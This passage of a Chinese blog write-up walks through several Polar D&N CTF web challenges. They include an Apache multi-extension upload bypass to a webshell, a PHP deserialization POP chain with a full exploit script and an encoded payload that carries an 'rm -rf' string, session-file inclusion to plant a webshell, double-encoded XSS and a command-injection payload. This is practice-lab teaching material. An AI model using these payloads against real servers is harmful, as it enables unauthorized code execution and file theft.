				<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$uploadfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">echo</span> <span class="token string double-quoted-string">"恭喜你，上传路径&lt;br&gt;路径为:"</span> <span class="token operator">.</span> <span class="token variable">$uploadfile</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span> 
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"恶意后缀,试试.jsp呢？&lt;br&gt;"</span><span class="token punctuation">;</span>
			
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>上传文件<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string double-quoted-string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"text/html; charset=utf-8"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
	千万别上传php脚本！！！！
	<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"upload.php"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"upfile"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">""</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"提交"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code></pre> 
<p>文件上传功能过滤php、htaccess后缀，过滤文件内容<code>&lt;?php</code>。看似山穷水尽，仔细一看发现存在apache解析漏洞。</p> 
<blockquote> 
 <p><strong>AddHandler导致的Apache解析漏洞</strong></p> 
 <p>如果服务器给.php后缀添加了处理器：<br> <strong>AddHandler application/x-httpd-php.php</strong></p> 
 <p>那么，在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，不需要是最后一个后缀。如shell.php.jpg中包含.php，所以解析为php文件</p> 
 <p><strong>利用：</strong></p> 
 <p>1、<strong>1.php.jpg</strong></p> 
 <p>2、1.php.txt</p> 
 <p><strong>影响范围：2.4.0-2.4.29版本</strong></p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/95/a4/JjNL1jdB_o.png" alt="image-20231209195015910"></p> 
<p>getsgell</p> 
<p><img src="https://images2.imgbox.com/0d/82/ch4DptaA_o.png" alt="image-20231209195033084"></p> 
<h2><a id="Polar___WEB_358"></a>Polar 冬 苦海（WEB）【】</h2> 
<p>反序列化+文件包含，难的是找flag。</p> 
<p><img src="https://images2.imgbox.com/41/8d/JQ2eRmfw_o.png" alt="image-20231209221749527"></p> 
<p>链子如下：</p> 
<pre><code>User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()
</code></pre> 
<p>给个EXP：</p> 
<pre><code class="prism language-php">删库跑路，蹲监狱<span class="token operator">~</span> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token comment">/*
PolarD&amp;N CTF
*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'PolarNight'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'syst3m("rm -rf ./*");'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"删库跑路，蹲监狱~"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hi, Welcome to Polar D&amp;N ~ "</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give you flag : "</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Surrender</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$promise</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'遵纪守法，好公民~'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">promise</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'苦海无涯，回头是岸！'</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">promise</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileRobot</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$path</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">Get_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Surrender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileRobot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'bucunzai'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileRobot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'../flag.php'</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//unserialize(serialize($a));</span>
</code></pre> 
<p>payload：</p> 
<pre><code>?user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A4%3A%22name%22%3BO%3A9%3A%22Surrender%22%3A4%3A%7Bs%3A16%3A%22%00Surrender%00phone%22%3Bi%3A110%3Bs%3A7%3A%22promise%22%3Bs%3A30%3A%22%E8%8B%A6%E6%B5%B7%E6%97%A0%E6%B6%AF%EF%BC%8C%E5%9B%9E%E5%A4%B4%E6%98%AF%E5%B2%B8%EF%BC%81%22%3Bs%3A4%3A%22file%22%3Ba%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A9%3A%22FileRobot%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22path%22%3BO%3A9%3A%22FileRobot%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A11%3A%22..%2Fflag.php%22%3Bs%3A4%3A%22path%22%3BN%3B%7D%7D%7Ds%3A7%3A%22content%22%3Ba%3A1%3A%7Bs%3A5%3A%22title%22%3Bs%3A8%3A%22bucunzai%22%3B%7D%7Ds%3A4%3A%22flag%22%3Bs%3A21%3A%22syst3m%28%22rm+-rf+.%2F%2A%22%29%3B%22%3B%7D
</code></pre> 
<p><img src="https://images2.imgbox.com/a5/4e/5gFIeBv3_o.png" alt="image-20231209223258448"></p> 
<h2><a id="Polar___safe_includeWEB_470"></a>Polar 冬 safe_include（WEB）</h2> 
<p>直接给了源码：</p> 
<p><img src="https://images2.imgbox.com/82/8d/3p5pzfsC_o.png" alt="image-20231209213312419"></p> 
<p><code>open_basedir</code>：限制PHP访问文件的目录（读写）,不限制命令执行的目录。</p> 
<p>这里开启了session，我们可以使用session文件包含，而且session文件不会被清理。我们可以利用他来getshell。</p> 
<hr> 
<p>在PHP中，使用$_SESSION[]可以存储特定用户的Session信息。并且每个用户的Session信息都是不同的。<br> 当用户请求网站中任意一个页面时，若用户未建立Session对象，则服务器会自动为用户创建一个Session对象，它包含唯一的sessionID和其他Session变量，并保存在服务器内存中，不同用户的Session对象存着各自指定的信息。</p> 
<p>利用Session变量存储信息：<br> $_SESSION[“sessionID”]=变量或字符串信息;</p> 
<p>读取Session变量信息（可赋值给一个变量或者直接输出）：<br> 变量=$_SESSION[“sessionID”];</p> 
<p>sessionID可以自己创造一个，比如jayjay。那么session文件名就是/tmp/sess_jayjay，里面存储了sessionID为jayjay的session变量信息。sessionID一般就是Cookie中PHPSESSID的值。当用户在Cookie中设置PHPSESSID=jayjay时，PHP就会生成一个文件/tmp/sess_jayjay，此时也就初始化了session。同时，这时候传参，参数值就自动被写入/tmp/sess_jayjay了。</p> 
<hr> 
<p>这里我们可以读取Session变量信息，也可以存储Session变量信息，那我们就可以往里面放🐎，然后包含🐎，getshell。</p> 
<p>存马到<code>sess_Jay17</code>文件。</p> 
<p><img src="https://images2.imgbox.com/08/88/KumRYzm7_o.png" alt="image-20231209221203948"></p> 
<p>包含<code>sess_Jay17</code>文件也就是包含马，getshell。</p> 
<p><img src="https://images2.imgbox.com/e0/d8/HomnY6tE_o.png" alt="image-20231209221251438"></p> 
<h2><a id="Polar___phpurlWEB_509"></a>Polar 冬 phpurl（WEB）</h2> 
<p>附件：</p> 
<pre><code>在某次渗透测试中，红队使用网站目录探测工具发现网站源码泄漏，该文件名疑似名被加密：aW5kZXgucGhwcw。 
</code></pre> 
<p><code>aW5kZXgucGhwcw</code>base64解码后是<code>index.phps</code></p> 
<p>开题</p> 
<p><img src="https://images2.imgbox.com/36/be/9OCQlhnS_o.png" alt="image-20231209124658870"></p> 
<p>访问<code>/index.phps</code>路由。直接给了源码</p> 
<p><img src="https://images2.imgbox.com/5d/93/i1k1ZfPE_o.png" alt="image-20231209124736036"></p> 
<p>很简单，xxs二次URL编码就行。</p> 
<p><img src="https://images2.imgbox.com/29/44/loPaWiQV_o.png" alt="image-20231209125259479"></p> 
<p>注意点：<code>/index.phps</code>只是源码泄露，传参在<code>/</code>路由。</p> 
<p><img src="https://images2.imgbox.com/e3/a7/G9CoDpFm_o.png" alt="image-20231209125310136"></p> 
<h2><a id="Polar___coolWEB_541"></a>Polar 冬 cool（WEB）</h2> 
<p>开题，直接给了源码</p> 
<p><img src="https://images2.imgbox.com/4c/10/2kxbuuJG_o.png" alt="image-20231209123959352"></p> 
<p>payload：</p> 
<pre><code>?a=echo `cat f*`;
</code></pre> 
<p><img src="https://images2.imgbox.com/2a/ba/J8kIdpTB_o.png" alt="image-20231209124345759"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5c0e15ec3b90411eab9fea815ce34cde/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Floyd算法求解各顶点之间最短路径问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/b305828fd1510430aea2f88c2145184c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【精选】SpringMVC简介及其执行流程，参数获取方式</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>